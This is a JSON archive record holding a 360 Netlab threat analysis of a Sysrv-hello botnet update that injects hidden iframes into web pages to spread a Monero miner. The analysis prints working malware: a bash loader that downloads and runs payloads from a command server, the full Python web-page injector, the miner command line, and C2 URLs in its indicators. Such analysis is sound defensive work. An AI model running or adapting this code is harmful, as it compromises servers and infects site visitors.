{
    "id": "88cad832-83f2-43ae-9a40-801a70a6b66c",
    "created_at": "2023-01-12T15:02:27.838308Z",
    "updated_at": "2025-03-27T02:05:22.417972Z",
    "deleted_at": null,
    "sha1_hash": "6ebd3e04f5b3d7de3716b0f51494e38e5e5da7e9",
    "title": "2021-04-29 - Threat Alert- New update from Sysrv-hello, now infecting victims‘ webpages to push malicious exe to end users",
    "authors": "",
    "file_creation_date": "2022-05-29T01:36:49Z",
    "file_modification_date": "2022-05-29T01:36:49Z",
    "file_size": 91282,
    "plain_text": "# Threat Alert: New update from Sysrv-hello, now infecting victims‘ webpages to push malicious exe to end users\n\n**blog.netlab.360.com/threat-alert-new-update-from-sysrv-hello-now-infecting-victims-webpages-to-push-malicious-exe-**\nto-end-users/\n\nLIU Ya April 29, 2021\n\n29 April 2021 / [sysrv](https://blog.netlab.360.com/tag/sysrv/)\n\n## Overview\n\nFrom the end of last year to now, we have see the uptick of the mining botnet families. While\nnew families have been popping up, some old ones are get frequently updated. Our BotMon\n[system has recently reported about the [rinfo][z0miner]. And the latest case comes from](https://blog.netlab.360.com/rinfo-is-making-a-comeback-and-is-scanning-and-mining-in-full-speed/)\n[Sysrv-hello. Two security companies have recently analyzed the new variant of the family [1]](https://help.aliyun.com/document_detail/196163.html)\n\n[[2], but we noticed sysrv's author pushed a new update on April 20, adding a new infection](https://www.lacework.com/sysrv-hello-expands-infrastructure/)\nmethod, injecting malicious script into the html page and infecting users when they visit the\ncompromised webpage.\n\n## New modules of a.py and BrowserUpdate.exe\n\nWe know that sysrv can infect both Linux and Windows systems, and its entry is a script file,\na bash script under Linux, the most common file name is ldr.sh, and a PowerShell script\nldr.ps1 under Windows. We noticed this new update only targets the Linux ldr.sh, which adds\nthe following code:\n```\ncurl $cc/BrowserUpdate.exe > /tmp/BrowserUpdate.exe\ncurl $cc/a.py > /tmp/a.py\npython /tmp/a.py &\nnohup python /tmp/a.py 1>/dev/null 2>&1 &\n\n```\nYou can see that 2 new modules were added: a.py and BrowserUpdate.exe, where a.py will\nbe executed directly by ldr.sh.\n\nThe a.py file is a Python program, with only 20 lines of code.\n\n\n-----\n\n```\nimport os\nd = \"<iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>\"\nfor _dir in [\"/var\", \"/usr/local\", \"/home\", \"/opt\"]:\n  for root, dirs, files in os.walk(_dir):\n    for i in files:\n      path = os.path.join(root, i)\n      if os.path.splitext(path)[1] not in [\".html\", \".php\", \".htm\", \".jsp\",\n\".asp\", \".tpl\"]:\n        continue\n      try:\n        with open(path) as f:\n          data = f.read()\n          if (d in data) or (\"<head>\" not in data):\n            continue\n        with open(path, \"w\") as f:\n          f.write(data.replace(\"<head>\", \"<head>\"+d))#+'<script\nasync=\"async\" src=\"//bmst.pw/6034003x100.js\"></script>'))\n      except:\n        continue\n      dst = os.path.join(root, \"BrowserUpdate.exe\")\n      os.system(\"cp -rf /tmp/BrowserUpdate.exe '%s'\" % dst)\nos.system(\"rm -rf /tmp/BrowserUpdate.exe\")\n\n```\nThe function of this code is to go through the directories of `\"/var\", \"/usr/local\",`\n```\n\"/home\" and \"/opt\" on the infected machine, looking for web files with \".html\",\n\".php\", \".htm\", \".jsp\", \".asp\" or \".tpl\" suffixes, and inserting an iframe code into\n\n```\nthem once found.\n```\n<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>\n\n```\nSo, if someone visits the modified web page, the BrowserUpdate.exe will be downloaded,\nhere let’s take a look at this exe file.\n\nBrowserUpdate.exe is a PE32 program packed with UPX. VT scan results show that it is a\n[malicious program of CoinMiner. The exe will release two 64-bit PE files:](https://www.virustotal.com/gui/file/59df8a62108bbf3120e6699e616417f393aefaf0574b1fd1ae2bcb7802d543da/detection)\n```\nCreateFileW(\"C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\ModuleInstaller.exe\",\n0x40000000, 0x0, NULL, 0x2, 0x80, 0x0)\nCreateFileW(\"C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\WinRing0x64.sys\", 0x40000000,\n0x0, NULL, 0x2, 0x80, 0x0)\n\n```\nThen BrowserUpdate.exe will call the two files using the following command.\n```\ncmd /c \\\"%TEMP%\\\\ModuleInstaller.exe\\\" --coin monero --donate-level 0 -o xmreu2.nanopool.org:14444 -u\n41wSatLj9j4ZnwkBj2bEL59TdW7Fp8mmcUpKPyuB5XeBZNMxHND2MpK75w4q4mLtNmhQGVUnTdhh4XTffKFQ1X\n\n```\nThe above command will start mining activity with the assigned pool and wallet. Actually the\n[released exe and sys belong to a set of xmrig suite, with ModuleInstaller.exe as the main](https://github.com/xmrig/xmrig)\n[program which loads WinRing0x64.sys driver. There have been reports about them by other](https://www.virustotal.com/gui/file/a2f3ecd329d2713855257bf922b8a092cbb1193327ba197351804275286df7dd/detection)\nvendors\n\n\n-----\n\n## Summary\n\nThrough the above analysis, it is easy to see that this update of Sysrv-hello is mainly to\nimprove the propagation ability, besides making the compromised linux machine a mining\nhost, by injecting malicious code into the webservers’ html pages, it could potentially infect\nvisiting users on Windows platform.\nConsidering that sysrv has been going through several updates, we expect that there might\nbe more actions coming. We will keep an eye on it.\n\n## Contact us\n\n[Readers are always welcomed to reach us on twitter, or email to netlab[at]360.cn.](https://twitter.com/360Netlab)\n\n## IoC\n\n### MD5\n```\n833822feda97936d690ff6b983ad1a87 ldr.sh\n645647171d92e1fe289b63bbd2f2db86 a.py\n048aa5b804cde0768111c633e0faa028 BrowserUpdate.exe\na7013a2c7fd3a6168a7c0d9eed825c32 MODULEINSTALLER.EXE\n0c0195c48b6b8582fa6f6373032118da WINRING0X64.SYS\n\n URL\nhttp://194.145.227.21/ldr.sh\nhttp://194.145.227.21/a.py\nhttp://194.145.227.21/BrowserUpdate.exe\nhttp://194.145.227.21/sys.i686\n\n miner pool and wallet\npool: xmr-eu2.nanopool.org:14444\nwallet：\n41wSatLj9j4ZnwkBj2bEL59TdW7Fp8mmcUpKPyuB5XeBZNMxHND2MpK75w4q4mLtNmhQGVUnTdhh4XTffKFQ1X\n\n```\n[360 Netlab Blog - Network Security Research Lab at 360](https://blog.netlab.360.com/)\n\n—\nThreat Alert: New update from Sysrv-hello, now infecting victims‘ webpages to push\nmalicious exe to end users\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-29 - Threat Alert- New update from Sysrv-hello, now infecting victims‘ webpages to push malicious exe to end users.pdf"
    ],
    "report_names": [
        "2021-04-29 - Threat Alert- New update from Sysrv-hello, now infecting victims‘ webpages to push malicious exe to end users.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535747,
    "ts_updated_at": 1743041122,
    "ts_creation_date": 1653788209,
    "ts_modification_date": 1653788209,
    "files": {
        "pdf": "https://archive.orkl.eu/6ebd3e04f5b3d7de3716b0f51494e38e5e5da7e9.pdf",
        "text": "https://archive.orkl.eu/6ebd3e04f5b3d7de3716b0f51494e38e5e5da7e9.txt",
        "img": "https://archive.orkl.eu/6ebd3e04f5b3d7de3716b0f51494e38e5e5da7e9.jpg"
    }
}